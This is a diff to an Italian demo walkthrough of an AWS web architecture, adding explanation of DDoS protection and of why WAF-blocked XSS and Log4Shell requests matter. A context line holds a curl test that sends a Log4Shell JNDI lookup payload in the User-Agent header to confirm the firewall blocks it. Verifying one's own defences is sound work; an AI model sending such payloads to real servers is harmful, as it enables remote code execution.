@@ -154,7 +154,7 @@ Quando un task api nasce o muore, ECS aggiorna da solo l'elenco del proxy. Per q
 
 I dati, al minuto 12. DynamoDB contiene prodotti, utenti, ordini e pagamenti. Valkey contiene sessioni e carrelli. S3 contiene le immagini. Le chiavi Stripe stanno in Parameter Store e arrivano ai container all'avvio, quindi nel repository non c'è nessun segreto.
 
-La sicurezza, al minuto 13. CloudFront è l'unico ingresso pubblico. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti. Shield Standard protegge dagli attacchi DDoS.
+La sicurezza, al minuto 13. Un sito può cadere anche senza nessun guasto: se qualcuno lo inonda di richieste, consuma la capacità che serve agli utenti veri. Lo scaling non basta, perché si ferma a 4 task, pagati per servire l'attaccante. Per questo il traffico si filtra prima che arrivi ai task. CloudFront è l'unico ingresso pubblico. Shield Standard ferma gli attacchi DDoS più comuni, quelli che inondano la rete. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti.
 
 ### Minuto 14 · Eventi del deploy
 
@@ -255,7 +255,7 @@ curl -s -o /dev/null -w "%{http_code}\n" "https://arrosticini.colagreco.dev/it/p
 curl -s -o /dev/null -w "%{http_code}\n" -H 'User-Agent: ${jndi:ldap://example.com/a}' "https://arrosticini.colagreco.dev/it"
 ```
 
-Le risposte attese sono 200, 403 e 403. La ricerca normale passa. La ricerca con uno script (XSS) e l'attacco Log4Shell vengono bloccati da CloudFront e non arrivano mai ai task.
+Le risposte attese sono 200, 403 e 403. La ricerca normale passa. La ricerca con uno script (XSS) e l'attacco Log4Shell vengono bloccati da CloudFront e non arrivano mai ai task. Questi due non cercano di far cadere il sito: servono a eseguire codice, il primo nel browser di un utente e il secondo sul server.
 
 Nella console WAF si vedono le richieste bloccate. La regola RateLimit oggi è in Count, altrimenti bloccherebbe k6.
 
